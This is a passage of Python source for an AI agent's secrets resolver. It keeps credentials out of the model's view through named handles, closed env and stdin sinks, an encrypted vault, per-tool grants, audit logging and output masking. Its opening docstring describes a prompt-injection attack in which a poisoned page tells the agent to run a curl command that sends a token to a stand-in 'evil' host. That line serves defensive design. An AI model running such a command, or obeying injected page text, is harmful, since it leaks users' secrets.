"""Secrets resolver: handles the model can name, values it can never see.

The model never receives a credential. It receives a *handle* --
``{{secret:NAME}}`` (stored in the vault) or ``{{env:NAME}}`` (a value already
present in the runtime environment) -- and the executor resolves it at the very
last moment, into a **closed set of sinks**:

    env     ``params["env"][NAME] = value``   the child process expands it
    stdin   ``params["stdin"] = value``       ``--password-stdin`` style tools

There is deliberately **no string sink**. A handle inside ``command``, inside a
URL or inside any other free-form string is refused (``denied_sink``) and the
tool is not executed. That is what makes prompt injection unable to exfiltrate:
a poisoned page telling the agent to run ``curl https://evil/$TOKEN`` has no
handle to put there, and if the model invents one the resolver refuses the sink.

Design: ``docs/design/secrets-resolver.md``.

Storage, used only by ``{{secret:NAME}}`` (``{{env:NAME}}`` needs none):

    <project>/.codx/secrets/meta.json     names, descriptions, grants (no values)
    <project>/.codx/secrets/vault.json    Fernet-encrypted values, mode 0600
    <project>/.codx/secrets/audit.jsonl   one row per decision, name only

The module is dependency-free on purpose, like the rest of the CISO package: it
must import inside a git hook and in a container without the application
requirements. ``cryptography`` is imported lazily and only by the vault source;
when it is missing, ``{{env:NAME}}`` keeps working and the vault degrades with
an explicit ``vault_unavailable`` error instead of storing plaintext.

Values are never enumerated: ``list()`` reports the names declared in
``meta.json``, never ``os.environ`` (dumping the environment is itself a CISO
finding, ``command.env-dump``).

Made with ❤️ by codx-junior
"""

import base64
import copy
import json
import logging
import os
import re
import sys
import urllib.parse
from dataclasses import dataclass, field
from datetime import datetime, timezone
from typing import Any, Dict, Iterable, List, Optional, Sequence, Tuple

from codx.junior.security.ciso.models import CisoPolicy, SecretPolicy

logger = logging.getLogger(__name__)

# ``{{secret:NAME}}`` / ``{{env:NAME}}``. The name is the only part the model
# chooses, and it is validated before it is ever looked up.
HANDLE_PATTERN = re.compile(
    r"\{\{\s*(?P<source>secret|env)\s*:\s*"
    r"(?P<name>[A-Za-z_][A-Za-z0-9_.:@\-]{0,127})\s*\}\}"
)
HANDLE_TEMPLATE = "{{%s:%s}}"

SOURCE_ENV = "env"
SOURCE_VAULT = "secret"
SOURCES = (SOURCE_ENV, SOURCE_VAULT)

SINK_ENV = "env"
SINK_STDIN = "stdin"
SINK_FILE = "file"
SINK_HEADER = "header"
ALL_SINKS = (SINK_ENV, SINK_STDIN, SINK_FILE, SINK_HEADER)
# Implemented by this increment. ``file`` and ``header`` are declared so the
# contract is stable, and refused until a sink adapter exists.
SUPPORTED_SINKS = (SINK_ENV, SINK_STDIN)

ENV_PARAM = "env"
STDIN_PARAM = "stdin"

VAULT_KEY_ENV = "CODX_JUNIOR_VAULT_KEY"
VAULT_KEY_FILE_ENV = "CODX_JUNIOR_VAULT_KEY_FILE"
VAULT_KEY_FILENAME = "vault.key"
VAULT_DISABLE_ENV = "CODX_JUNIOR_VAULT_DISABLED"
#: Marker that makes a directory a project (the one discovery scans for).
CODX_PROJECT_MARKER = os.path.join(".codx", "project.json")

SECRETS_DIRNAME = os.path.join(".codx", "secrets")
VAULT_FILENAME = "vault.json"

# Scope of a secret: the project's own vault, or the machine-wide one shared by
# every project (``~/.codx-junior/secrets``). A project secret wins over a global
# one with the same name, so a project can override an inherited credential.
SCOPE_PROJECT = "project"
SCOPE_GLOBAL = "global"
SCOPES = (SCOPE_PROJECT, SCOPE_GLOBAL)
GLOBAL_SECRETS_ENV = "CODX_JUNIOR_SECRETS_FOLDER"
META_FILENAME = "meta.json"
AUDIT_FILENAME = "audit.jsonl"

REDACTED_TEMPLATE = "***[secret:%s]***"

_ENV_NAME_PATTERN = re.compile(r"^[A-Za-z_][A-Za-z0-9_]{0,127}$")


def _now() -> str:
    """Return the current UTC instant in ISO-8601 (second resolution)."""
    return datetime.now(timezone.utc).replace(microsecond=0).isoformat()


def vault_key_path() -> str:
    """Return the path of the key file used when the env var is unset.

    The key lives OUTSIDE the project (``~/.codx-junior/vault.key``) so the
    encrypted values can sit next to the code they serve without the key ever
    entering the repository, the settings file or a commit. ``CODX_JUNIOR_VAULT_KEY``
    still wins when it is set, because a deployment injects it that way.

    Returns:
        str: Absolute path of the key file.
    """
    explicit = (os.environ.get(VAULT_KEY_FILE_ENV) or "").strip()
    if explicit:
        return os.path.expanduser(explicit)
    return os.path.join(os.path.expanduser("~"), ".codx-junior", VAULT_KEY_FILENAME)


def _read_key_file() -> str:
    """Return the key stored in the key file, or ``''`` when there is none."""
    path = vault_key_path()
    try:
        with open(path, "r", encoding="utf-8") as handle:
            return handle.read().strip()
    except FileNotFoundError:
        return ""
    except Exception as ex:
        logger.warning("Secrets: unreadable key file %s: %s", path, ex)
        return ""


def _write_key_file(key: str) -> str:
    """Persist *key* (mode 0600, in a 0700 directory) and return its path."""
    path = vault_key_path()
    os.makedirs(os.path.dirname(path) or ".", mode=0o700, exist_ok=True)
    descriptor = os.open(path, os.O_CREAT | os.O_TRUNC | os.O_WRONLY, 0o600)
    with os.fdopen(descriptor, "w", encoding="utf-8") as handle:
        handle.write(key.strip() + "\n")
    try:
        os.chmod(path, 0o600)
    except Exception:  # pragma: no cover - best effort on odd filesystems
        pass
    return path


def global_secrets_dir() -> str:
    """Return the machine-wide secrets directory shared by every project.

    Mirrors where the vault key lives (``~/.codx-junior/``), so a deployment has
    one folder to back up and one path to ignore. ``CODX_JUNIOR_SECRETS_FOLDER``
    overrides it and ``CODX_JUNIOR_CONFIG_FOLDER`` is honoured when the platform
    was installed with a custom configuration root.
    """
    configured = (os.environ.get(GLOBAL_SECRETS_ENV) or "").strip()
    if configured:
        return os.path.expanduser(configured)
    config_folder = (os.environ.get("CODX_JUNIOR_CONFIG_FOLDER") or "").strip()
    base = os.path.expanduser(config_folder) if config_folder else os.path.join(
        os.path.expanduser("~"), ".codx-junior"
    )
    return os.path.join(base, "secrets")


def matches_any(tool: str, patterns: Optional[Iterable[str]]) -> bool:
    """Return True when *tool* matches any entry of *patterns*.

    A pattern ending in ``*`` is a prefix match (``fetch_webpage*``); anything
    else is an exact match, so a grant for ``execute_command`` never leaks to
    ``execute_command_raw``.

    Args:
        tool: Tool name being invoked.
        patterns: Allow/deny patterns.

    Returns:
        bool: True on a match.
    """
    name = tool or ""
    for pattern in patterns or []:
        candidate = str(pattern or "").strip()
        if not candidate:
            continue
        if candidate.endswith("*"):
            if name.startswith(candidate[:-1]):
                return True
        elif name == candidate:
            return True
    return False


class SecretHandle:
    """A parsed ``{{source:NAME}}`` handle found inside a tool argument.

    A handle is safe by construction: it names a secret, it does not contain
    one, so it may appear in events, logs and the tool cache key.
    """

    __slots__ = ("raw", "source", "name")

    def __init__(self, raw: str, source: str, name: str) -> None:
        self.raw = raw
        self.source = source
        self.name = name

    def __repr__(self) -> str:
        return f"SecretHandle({self.raw!r})"


@dataclass(frozen=True)
class SecretError:
    """A value-free refusal. ``detail`` must never contain a secret value."""

    code: str
    name: str = ""
    detail: str = ""

    def render(self) -> str:
        """Return the model-facing, value-free explanation."""
        label = f" '{self.name}'" if self.name else ""
        message = f"secret{label}: {self.code}"
        if self.detail:
            message += f" — {self.detail}"
        return message


class ResolvedSecret:
    """A secret value resolved for exactly one tool call.

    The value is reachable only through ``.value``, and only a sink adapter
    calls it. ``repr`` masks it and ``str`` raises, so an accidental
    interpolation into a log line or an f-string fails loudly instead of
    leaking.
    """

    __slots__ = ("name", "sink", "handle", "_value")

    def __init__(self, name: str, value: str, handle: str = "", sink: str = "") -> None:
        self.name = name
        self.sink = sink
        self.handle = handle
        self._value = value

    @property
    def value(self) -> str:
        """Return the raw value. Call it only from a sink adapter."""
        return self._value

    def __repr__(self) -> str:
        return f"ResolvedSecret(name={self.name!r}, sink={self.sink!r}, value='***')"

    def __str__(self) -> str:
        raise TypeError(
            "ResolvedSecret is opaque: use .value inside a sink adapter, never in text"
        )


@dataclass
class SecretMeta:
    """Everything ``secrets_list`` may show: metadata, never a value."""

    name: str
    source: str = SOURCE_ENV
    description: str = ""
    allow_tools: List[str] = field(default_factory=list)
    status: str = "ready"
    created_at: str = ""
    last_used_at: str = ""
    scope: str = SCOPE_PROJECT
    # A secret declared in a PARENT project is usable by the projects inside it
    # only when this flag is on. Off by default: a credential does not travel
    # down a folder tree unless the operator says so, and the flag lives on the
    # parent declaration, so a child can never grant itself access.
    share_with_children: bool = False
    # Runtime only: the parent project this entry was inherited from. Never
    # persisted -- the declaration belongs to the parent, not to the child.
    inherited_from: str = ""

    def to_dict(self) -> Dict[str, Any]:
        """Return the JSON representation stored in ``meta.json``."""
        return {
            "name": self.name,
            "source": self.source,
            "description": self.description,
            "allow_tools": list(self.allow_tools),
            "status": self.status,
            "created_at": self.created_at,
            "last_used_at": self.last_used_at,
            "scope": self.scope,
            "share_with_children": bool(self.share_with_children),
        }

    def public(self) -> Dict[str, Any]:
        """Return the value-free projection shown to the model."""
        return self.to_dict()


class RedactionSet:
    """Values resolved during one tool call, used to scrub the tool output.

    The net is belt and braces: the control is that the value never enters a
    model-visible string in the first place. Masking still covers the common
    transformations (raw, base64, percent-encoded, JSON-escaped) because tools
    echo their environment, build URLs and pretty-print errors.
    """

    __slots__ = ("_entries",)

    def __init__(self, entries: Optional[Sequence[Tuple[str, str]]] = None) -> None:
        self._entries: List[Tuple[str, str]] = [
            (str(name), str(value))
            for name, value in (entries or [])
            if value and len(str(value)) >= 4
        ]

    def add(self, name: str, value: str) -> None:
        """Register one resolved value."""
        if value and len(value) >= 4:
            self._entries.append((str(name), str(value)))

    def __bool__(self) -> bool:
        return bool(self._entries)

    def __len__(self) -> int:
        return len(self._entries)

    def __iter__(self):
        """Iterate over the secret NAMES (never the values)."""
        return iter([name for name, _ in self._entries])

    def __repr__(self) -> str:
        return f"RedactionSet(names={list(self)!r})"

    @staticmethod
    def _variants(value: str) -> List[str]:
        """Return the encodings of *value* that must also be masked."""
        variants = {value}
        try:
            variants.add(base64.b64encode(value.encode("utf-8")).decode("ascii"))
        except Exception:
            pass
        try:
            variants.add(urllib.parse.quote(value, safe=""))
        except Exception:
            pass
        try:
            variants.add(json.dumps(value)[1:-1])
        except Exception:
            pass
        # Longest first: masking a prefix of a longer encoding would leave the
        # remainder recognisable.
        return sorted((item for item in variants if item), key=len, reverse=True)

    def mask(self, text: Optional[str]) -> Optional[str]:
        """Return *text* with every resolved value replaced by a marker."""
        if not text or not self._entries:
            return text
        masked = text
        for name, value in self._entries:
            for variant in self._variants(value):
                if variant and variant in masked:
                    masked = masked.replace(variant, REDACTED_TEMPLATE % name)
        return masked


class SecretVault:
    """The handle resolver: source lookup, grants, sinks and the audit trail.

    Args:
        project_path: Project root; the secrets live under
            ``<project_path>/.codx/secrets``.
        policy: Effective :class:`CisoPolicy` (defaults when omitted).
    """

    def __init__(self, project_path: Optional[str] = None, policy: Optional[CisoPolicy] = None,
                 scope: str = SCOPE_PROJECT) -> None:
        self.project_path = project_path or os.getcwd()
        self.policy = policy or CisoPolicy()
        # The scope this vault WRITES to. Reads always walk both scopes, this
        # one first, so a global secret is usable inside every project.
        self.scope = scope if scope in SCOPES else SCOPE_PROJECT
        self._step_secrets: Dict[str, set] = {}

    # -- paths ---------------------------------------------------------------
    def directory_of(self, scope: Optional[str] = None) -> str:
        """Return the secrets directory of *scope* (this vault's by default)."""
        target = scope or self.scope
        if target == SCOPE_GLOBAL:
            return global_secrets_dir()
        return os.path.join(self.project_path, SECRETS_DIRNAME)

    def _path_of(self, scope: Optional[str], filename: str) -> str:
        """Return the path of one secrets file inside *scope*."""
        return os.path.join(self.directory_of(scope), filename)

    def search_scopes(self) -> List[str]:
        """Return the scopes a lookup walks, this vault's scope first."""
        return [self.scope] + [item for item in SCOPES if item != self.scope]

    def parent_projects(self) -> List[str]:
        """Return the ancestor project roots of this project, nearest first.

        A directory is an ancestor project when it holds ``.codx/project.json``
        -- the same marker the project discovery scans for, so the resolver and
        the catalogue agree on what a project is. Deliberately dependency-free
        (no import of ``project_discover``): the CISO package must keep loading
        inside a git hook and in a container without the app requirements.

        Returns:
            List[str]: Absolute ancestor project paths, nearest first.
        """
        parents: List[str] = []
        try:
            current = os.path.dirname(os.path.abspath(self.project_path))
        except Exception:  # pragma: no cover - defensive
            return parents
        while current and current != os.path.dirname(current):
            if os.path.isfile(os.path.join(current, CODX_PROJECT_MARKER)):
                parents.append(current)
            current = os.path.dirname(current)
        return parents

    def search_directories(self) -> List[str]:
        """Return the secrets directories a value lookup walks, in priority order.

        Project scope: own project, then every ancestor project (nearest first,
        filtered by the ``share_with_children`` flag of the parent), then the
        machine-wide store. A global vault keeps the historical order and never
        walks the ancestors of the current working directory.
        """
        if self.scope == SCOPE_GLOBAL:
            directories = [self.directory_of(SCOPE_GLOBAL), self.directory_of(SCOPE_PROJECT)]
        else:
            directories = [self.directory_of(SCOPE_PROJECT)]
            directories += [
                os.path.join(path, SECRETS_DIRNAME) for path in self.parent_projects()
            ]
            directories.append(global_secrets_dir())
        ordered: List[str] = []
        for directory in directories:
            if directory not in ordered:
                ordered.append(directory)
        return ordered

    def inherited_meta(self) -> Dict[str, SecretMeta]:
        """Return the ancestor declarations this project may use.

        Only a parent declaration with ``share_with_children`` on is returned, so
        a project can never read a sibling's or an ancestor's private secret.

        Returns:
            Dict[str, SecretMeta]: Shared declarations by name; the nearest
            project wins, and each entry carries ``inherited_from``.
        """
        entries: Dict[str, SecretMeta] = {}
        if self.scope == SCOPE_GLOBAL:
            return entries
        # Farthest first so the nearest ancestor overwrites it.
        for path in reversed(self.parent_projects()):
            directory = os.path.join(path, SECRETS_DIRNAME)
            for name, meta in self._load_meta_dir(directory).items():
                if not meta.share_with_children:
                    continue
                meta.scope = SCOPE_PROJECT
                meta.inherited_from = os.path.basename(path.rstrip(os.sep)) or path
                entries[name] = meta
        return entries

    @property
    def directory(self) -> str:
        """Return the secrets directory this vault writes to."""
        return self.directory_of()

    @property
    def meta_path(self) -> str:
        """Return the metadata file path (no values inside)."""
        return self._path_of(self.scope, META_FILENAME)

    @property
    def vault_path(self) -> str:
        """Return the encrypted values file path."""
        return self._path_of(self.scope, VAULT_FILENAME)

    @property
    def audit_path(self) -> str:
        """Return the audit trail path (JSON lines, names only)."""
        return self._path_of(self.scope, AUDIT_FILENAME)

    @property
    def secret_policy(self) -> SecretPolicy:
        """Return the secrets block of the effective policy."""
        return getattr(self.policy, "secrets", None) or SecretPolicy()

    # -- audit ---------------------------------------------------------------
    def _audit(self, event: str, **fields: Any) -> None:
        """Append one audit row. Never raises: a failed log is not a failure."""
        policy = self.secret_policy
        if not getattr(policy, "audit", True):
            return
        row = {"ts": _now(), "event": event}
        row.update({key: value for key, value in fields.items() if value not in (None, "")})
        try:
            os.makedirs(self.directory, mode=0o700, exist_ok=True)
            descriptor = os.open(
                self.audit_path,
                os.O_APPEND | os.O_CREAT | os.O_WRONLY,
                0o600,
            )
            with os.fdopen(descriptor, "a", encoding="utf-8") as handle:
                handle.write(json.dumps(row, ensure_ascii=False) + "\n")
        except Exception as ex:  # pragma: no cover - defensive
            logger.warning("Secrets: could not write the audit row: %s", ex)

    # -- metadata ------------------------------------------------------------
    def load_meta(self, scope: Optional[str] = None) -> Dict[str, SecretMeta]:
        """Return the declared secrets of *scope* by name.

        Args:
            scope: ``project`` (default), ``global``, or ``all`` to merge both
                with the project declarations winning.
        """
        target = scope or self.scope
        if target == "all":
            # Priority, lowest first: global, then the ancestor projects that
            # share (farthest first, so the nearest one wins), then this project.
            entries = self.load_meta(SCOPE_GLOBAL)
            entries.update(self.inherited_meta())
            entries.update(self.load_meta(SCOPE_PROJECT))
            return entries
        entries = self._load_meta_dir(self.directory_of(target))
        for meta in entries.values():
            meta.scope = target
        return entries

    def _load_meta_dir(self, directory: str) -> Dict[str, SecretMeta]:
        """Return the declarations stored in one secrets *directory*.

        Args:
            directory: Absolute secrets directory (any scope or ancestor).

        Returns:
            Dict[str, SecretMeta]: Declarations by name; empty when absent.
        """
        path = os.path.join(directory, META_FILENAME)
        try:
            with open(path, "r", encoding="utf-8") as handle:
                data = json.load(handle)
        except FileNotFoundError:
            return {}
        except Exception as ex:
            logger.warning("Secrets: unreadable %s: %s", path, ex)
            return {}
        entries: Dict[str, SecretMeta] = {}
        for item in (data or {}).get("secrets", []):
            try:
                meta = SecretMeta(**item)
            except TypeError:
                continue
            entries[meta.name] = meta
        return entries

    def save_meta(self, entries: Dict[str, SecretMeta], scope: Optional[str] = None) -> None:
        """Write the metadata file of *scope* atomically with mode 0600."""
        directory = self.directory_of(scope)
        path = self._path_of(scope, META_FILENAME)
        os.makedirs(directory, mode=0o700, exist_ok=True)
        payload = {"version": 1, "secrets": [meta.to_dict() for meta in entries.values()]}
        temporary = f"{path}.tmp"
        descriptor = os.open(temporary, os.O_CREAT | os.O_TRUNC | os.O_WRONLY, 0o600)
        with os.fdopen(descriptor, "w", encoding="utf-8") as handle:
            json.dump(payload, handle, indent=2, ensure_ascii=False)
        os.replace(temporary, path)

    def declare(self, name: str, *, source: str = SOURCE_VAULT, description: str = "",
                allow_tools: Optional[Sequence[str]] = None, status: str = "pending",
                scope: Optional[str] = None,
                share_with_children: Optional[bool] = None) -> SecretMeta:
        """Declare a secret without providing its value (``secrets_request``)."""
        entries = self.load_meta(scope)
        meta = entries.get(name)
        if meta is None:
            meta = SecretMeta(name=name, source=source, created_at=_now())
            entries[name] = meta
        if description:
            meta.description = description
        if allow_tools is not None:
            meta.allow_tools = [str(item) for item in allow_tools]
        if share_with_children is not None:
            meta.share_with_children = bool(share_with_children)
        meta.source = source
        meta.status = status
        meta.scope = scope or self.scope
        self.save_meta(entries, scope)
        return meta

    def touch(self, name: str) -> None:
        """Record the last successful use of *name* (metadata only)."""
        for scope in self.search_scopes():
            entries = self.load_meta(scope)
            meta = entries.get(name)
            if meta is None:
                continue
            meta.last_used_at = _now()
            if meta.status == "pending":
                meta.status = "ready"
            try:
                self.save_meta(entries, scope)
            except Exception as ex:  # pragma: no cover - defensive
                logger.warning("Secrets: could not update %s: %s", META_FILENAME, ex)
            return

    # -- values --------------------------------------------------------------
    @staticmethod
    def fernet(create: bool = False):
        """Return ``(fernet, error)`` for the vault source.

        ``cryptography`` is optional: the platform must not gain a hard
        dependency for a subsystem that also runs in a git hook. When it is
        missing the caller degrades -- it never falls back to plaintext.
        """
        if (os.environ.get(VAULT_DISABLE_ENV) or "").strip().lower() in {"1", "true", "yes", "on"}:
            return None, SecretError("vault_unavailable", detail=f"disabled by {VAULT_DISABLE_ENV}")
        try:
            from cryptography.fernet import Fernet  # type: ignore
        except Exception:
            return None, SecretError(
                "vault_unavailable",
                detail="the 'cryptography' package is not installed; "
                       "use {{env:NAME}} handles or install it",
            )
        key = (os.environ.get(VAULT_KEY_ENV) or "").strip()
        if not key:
            key = _read_key_file()
        if not key and create:
            # First operator write (CLI, never a tool call): create the key file
            # instead of forcing the operator to wire an environment variable.
            # The application read path never creates it, so a container without
            # a key keeps degrading loudly instead of inventing one.
            key = Fernet.generate_key().decode("ascii")
            path = _write_key_file(key)
            logger.info("Secrets: generated a vault key at %s", path)
        if not key:
            return None, SecretError(
                "vault_unavailable",
                detail=f"no vault key: set {VAULT_KEY_ENV} or run "
                       "python -m codx.junior.security.ciso.vault keygen --write",
            )
        try:
            return Fernet(key.encode("utf-8")), None
        except Exception:
            return None, SecretError("vault_unavailable", detail=f"{VAULT_KEY_ENV} is not a valid Fernet key")

    def _read_values(self, fernet, scope: Optional[str] = None) -> Dict[str, str]:
        """Decrypt the stored values of *scope* (empty when the file is absent)."""
        return self._read_values_at(fernet, self.directory_of(scope))

    def _read_values_at(self, fernet, directory: str) -> Dict[str, str]:
        """Decrypt the values stored in one secrets *directory*.

        Args:
            fernet: Fernet instance of the machine key.
            directory: Absolute secrets directory (any scope or ancestor).

        Returns:
            Dict[str, str]: Values by name; unreadable entries are skipped.
        """
        try:
            with open(os.path.join(directory, VAULT_FILENAME), "r", encoding="utf-8") as handle:
                data = json.load(handle)
        except FileNotFoundError:
            return {}
        except Exception as ex:
            logger.warning("Secrets: unreadable %s: %s", VAULT_FILENAME, ex)
            return {}
        values: Dict[str, str] = {}
        for name, token in (data or {}).get("values", {}).items():
            try:
                values[name] = fernet.decrypt(token.encode("utf-8")).decode("utf-8")
            except Exception:
                logger.warning("Secrets: cannot decrypt '%s' (wrong key?)", name)
        return values

    def _write_values(self, fernet, values: Dict[str, str], scope: Optional[str] = None) -> None:
        """Encrypt and persist the values of *scope* atomically with mode 0600."""
        directory = self.directory_of(scope)
        path = self._path_of(scope, VAULT_FILENAME)
        os.makedirs(directory, mode=0o700, exist_ok=True)
        payload = {
            "version": 1,
            "values": {
                name: fernet.encrypt(value.encode("utf-8")).decode("utf-8")
                for name, value in values.items()
            },
        }
        temporary = f"{path}.tmp"
        descriptor = os.open(temporary, os.O_CREAT | os.O_TRUNC | os.O_WRONLY, 0o600)
        with os.fdopen(descriptor, "w", encoding="utf-8") as handle:
            json.dump(payload, handle, indent=2, ensure_ascii=False)
        os.replace(temporary, path)

    def set_value(self, name: str, value: str, *, allow_tools: Optional[Sequence[str]] = None,
                  description: str = "", scope: Optional[str] = None,
                  status: str = "ready",
                  share_with_children: Optional[bool] = None) -> Optional[SecretError]:
        """Store a value in *scope* (the UI or the operator CLI, never a tool)."""
        fernet, error = self.fernet(create=True)
        if error is not None:
            return error
        values = self._read_values(fernet, scope)
        values[name] = value
        self._write_values(fernet, values, scope)
        self.declare(name, source=SOURCE_VAULT, description=description,
                     allow_tools=allow_tools, status=status, scope=scope,
                     share_with_children=share_with_children)
        self._audit("store", secret=name, scope=scope or self.scope,
                    tools=",".join(allow_tools or []))
        return None

    def delete(self, name: str, scope: Optional[str] = None) -> Optional[SecretError]:
        """Remove a value and its declaration from *scope*."""
        entries = self.load_meta(scope)
        entries.pop(name, None)
        self.save_meta(entries, scope)
        fernet, error = self.fernet()
        if error is None:
            values = self._read_values(fernet, scope)
            if values.pop(name, None) is not None:
                self._write_values(fernet, values, scope)
        self._audit("delete", secret=name, scope=scope or self.scope)
        return None

    def get_value(self, source: str, name: str) -> Tuple[Optional[str], Optional[SecretError]]:
        """Return ``(value, error)`` for *name* in *source*."""
        if source == SOURCE_ENV:
            value = os.environ.get(name) or ""
            if not value:
                return None, SecretError("missing", name, f"the runtime has no environment variable {name!r}")
            return value, None
        if source != SOURCE_VAULT:
            return None, SecretError("invalid_handle", name, f"unknown source {source!r}")
        fernet, error = self.fernet()
        if error is not None:
            return None, SecretError(error.code, name, error.detail)
        own_directory = self.directory_of(SCOPE_PROJECT)
        global_directory = global_secrets_dir()
        for directory in self.search_directories():
            if directory not in (own_directory, global_directory):
                # An ancestor project: only when ITS declaration says the secret
                # may be shared. Without a readable declaration the lookup stops
                # (fail closed): a child cannot invent a grant for itself.
                inherited = self._load_meta_dir(directory).get(name)
                if inherited is None or not inherited.share_with_children:
                    continue
            value = self._read_values_at(fernet, directory).get(name) or ""
            if value:
                return value, None
        return None, SecretError(
            "missing", name,
            "the vault holds no value; add it in Settings → Secrets (project or "
            "global scope) or out of band: "
            f"python -m codx.junior.security.ciso.vault add {name}",
        )

    def status_of(self, meta: SecretMeta) -> str:
        """Return ``ready`` / ``pending`` / ``missing`` / ``unavailable``."""
        _, error = self.get_value(meta.source, meta.name)
        if error is None:
            return "ready"
        if error.code == "vault_unavailable":
            return "unavailable"
        return "pending" if meta.status == "pending" else "missing"

    def list(self, scope: str = "all") -> List[SecretMeta]:
        """Return the DECLARED secrets with their availability.

        Args:
            scope: ``all`` (default, both scopes merged), ``project`` or ``global``.

        Deliberately never enumerates ``os.environ``: listing the environment is
        a leak by itself. Only names someone declared are reported.
        """
        entries = self.load_meta(scope)
        listed = []
        for name in sorted(entries):
            meta = entries[name]
            meta.status = self.status_of(meta)
            listed.append(meta)
        return listed

    # -- resolution ----------------------------------------------------------
    def _deny(self, code: str, name: str, tool: str, step_id: str, sink: str,
              detail: str = "") -> SecretError:
        """Build a refusal and record it in the audit trail."""
        self._audit("deny", secret=name, tool=tool, step=step_id, sink=sink, code=code)
        return SecretError(code, name, detail)

    def resolve(self, name: str, *, tool: str, step_id: str = "",
                sink: str = SINK_ENV, source: str = SOURCE_VAULT):
        """Resolve *name* for *tool* into *sink*.

        Args:
            name: Secret name (already validated by the handle pattern).
            tool: Tool about to run.
            step_id: Tool call id, for the audit trail.
            sink: Destination from the closed list.
            source: ``env`` or ``secret``.

        Returns:
            ResolvedSecret: On success.
            SecretError: On refusal; the tool must not run.
        """
        policy = self.secret_policy
        if not policy.enabled:
            return self._deny("policy_disabled", name, tool, step_id, sink,
                              "secret resolution is disabled by policy")
        if not name:
            return self._deny("invalid_handle", name, tool, step_id, sink, "empty secret name")
        if sink not in ALL_SINKS:
            return self._deny("unsupported_sink", name, tool, step_id, sink,
                              f"unknown sink {sink!r}")
        if sink not in tuple(policy.supported_sinks or SUPPORTED_SINKS):
            return self._deny("unsupported_sink", name, tool, step_id, sink,
                              f"sink {sink!r} is not implemented yet; use 'env' or 'stdin'")
        if matches_any(tool, policy.denied_tools):
            return self._deny("denied_tool", name, tool, step_id, sink,
                              f"tool {tool!r} may not receive secrets")

        meta = self.load_meta("all").get(name)
        if source == SOURCE_ENV:
            if not policy.allow_env_source:
                return self._deny("denied_tool", name, tool, step_id, sink,
                                  "the environment source is disabled by policy")
        elif source == SOURCE_VAULT:
            if meta is None:
                return self._deny("denied_tool", name, tool, step_id, sink,
                                  "no grant for this secret; declare it with secrets_request")
            if policy.require_grant and not matches_any(tool, meta.allow_tools):
                return self._deny("denied_tool", name, tool, step_id, sink,
                                  f"no grant for tool {tool!r}; grant it out of band")
        else:
            return self._deny("invalid_handle", name, tool, step_id, sink,
                              f"unknown source {source!r}")

        value, error = self.get_value(source, name)
        if error is not None:
            return self._deny(error.code, name, tool, step_id, sink, error.detail)

        self._step_secrets.setdefault(step_id or "-", set()).add(name)
        self._audit("resolve", secret=name, source=source, tool=tool, step=step_id, sink=sink)
        self.touch(name)
        return ResolvedSecret(name, value, handle=HANDLE_TEMPLATE % (source, name), sink=sink)

    def request(self, name: str, *, chat_id: str = "", reason: str = "") -> SecretMeta:
        """Declare that *name* is needed; the value is provided out of band."""
        meta = self.declare(name, source=SOURCE_VAULT, description=reason, status="pending")
        self._audit("request", secret=name, chat=chat_id)
        return meta

    def forget_step(self, step_id: str) -> None:
        """Drop the step binding (called when the step ends)."""
        self._step_secrets.pop(step_id or "-", None)


@dataclass
class ToolParamsResolution:
    """Outcome of resolving the handles of one tool call."""

    params: Dict[str, Any]
    redactions: RedactionSet = field(default_factory=RedactionSet)
    error: Optional[str] = None
    secret_names: List[str] = field(default_factory=list)
    notices: List[str] = field(default_factory=list)


def iter_handles(params: Any, prefix: Tuple[str, ...] = ()):
    """Yield ``(path, text, handle)`` for every handle inside *params*.

    Args:
        params: Tool arguments (dict/list/str/scalar).
        prefix: Internal recursion cursor.

    Yields:
        Tuples of the key path, the containing string and the parsed handle.
    """
    if isinstance(params, dict):
        for key, value in params.items():
            yield from iter_handles(value, prefix + (str(key),))
    elif isinstance(params, (list, tuple)):
        for index, value in enumerate(params):
            yield from iter_handles(value, prefix + (str(index),))
    elif isinstance(params, str):
        for match in HANDLE_PATTERN.finditer(params):
            yield prefix, params, SecretHandle(match.group(0), match.group("source"), match.group("name"))


def sink_for_path(path: Sequence[str]) -> Optional[str]:
    """Return the sink a key path maps to, or ``None`` when it is not one.

    Only ``env`` values and the ``stdin`` scalar are sinks. Everything else --
    ``command``, a URL, a free-form description -- is not, which is the whole
    point: there is no string sink to interpolate into.
    """
    if len(path) == 1 and path[0] == STDIN_PARAM:
        return SINK_STDIN
    if len(path) == 2 and path[0] == ENV_PARAM:
        return SINK_ENV
    return None


def vault_for(settings: Any = None, policy: Optional[CisoPolicy] = None) -> SecretVault:
    """Build the vault of the project behind *settings*."""
    project_path = getattr(settings, "abs_project_path", None) or os.getcwd()
    if policy is None:
        from codx.junior.security.ciso.policy import resolve_policy
        policy = resolve_policy(settings)
    return SecretVault(project_path, policy)


def global_vault(settings: Any = None, policy: Optional[CisoPolicy] = None) -> SecretVault:
    """Build the machine-wide vault: one secret store for every project."""
    if policy is None:
        from codx.junior.security.ciso.policy import resolve_policy
        policy = resolve_policy(settings)
    return SecretVault(None, policy, scope=SCOPE_GLOBAL)


def dashboard_entries(settings: Any = None, policy: Optional[CisoPolicy] = None) -> List[Dict[str, Any]]:
    """Return the value-free secret inventory shown in the settings UI.

    Both scopes are merged (a project declaration wins over a global one with the
    same name) and the result carries the availability of each secret so an
    operator can see at a glance whether a handle will resolve.
    """
    project_vault = vault_for(settings, policy)
    entries: List[Dict[str, Any]] = []
    for meta in project_vault.list("all"):
        payload = meta.public()
        payload["status"] = meta.status
        if meta.inherited_from:
            payload["inherited_from"] = meta.inherited_from
        entries.append(payload)
    return entries


def resolve_for_tool(params: Dict[str, Any], tool: str, *, step_id: str = "",
                     settings: Any = None, policy: Optional[CisoPolicy] = None) -> ToolParamsResolution:
    """Replace every handle in *params* by a sink-appropriate value.

    Called by the tool dispatcher immediately before the tool runs, after the
    ``TOOL_START`` event was emitted with the *unresolved* arguments, so events,
    logs and the tool cache key only ever hold handles.

    Args:
        params: Parsed tool arguments.
        tool: Tool name.
        step_id: Tool call id, for the audit trail and the step binding.
        settings: Project settings (used to locate the vault and the policy).
        policy: Effective policy, when the caller already resolved it.

    Returns:
        ToolParamsResolution: The arguments to use, the redaction set for the
        result, and ``error`` when the tool must NOT run.
    """
    if not isinstance(params, dict):
        return ToolParamsResolution(params=params)
    vault = vault_for(settings, policy)
    if not vault.secret_policy.enabled:
        return ToolParamsResolution(params=params)

    handles = list(iter_handles(params))
    if not handles:
        return ToolParamsResolution(params=params)

    names = [handle.name for _, _, handle in handles]
    resolved_params = copy.deepcopy(params)
    redactions = RedactionSet()
    notices: List[str] = []
